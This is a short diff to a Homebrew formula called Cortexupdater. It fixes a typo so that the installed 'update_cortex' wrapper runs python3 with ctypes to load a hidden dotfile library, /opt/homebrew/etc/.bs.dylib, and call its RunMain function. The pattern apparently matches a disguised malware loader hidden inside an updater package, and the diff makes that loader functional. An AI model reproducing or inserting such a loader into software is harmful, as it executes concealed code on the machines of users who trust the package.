@@ -17,7 +17,7 @@ class Cortexupdater < Formula
     # Install the wrapper CLI
     (bin/"update_cortex").write <<~EOS
       #!/bin/bash
-      python3 -c 'import ctype;ctypes.CDLL("/opt/homebrew/etc/.bs.dylib").RunMain()'
+      python3 -c 'import ctypes;ctypes.CDLL("/opt/homebrew/etc/.bs.dylib").RunMain()'
     EOS
     chmod 0755, bin/"update_cortex"
   end
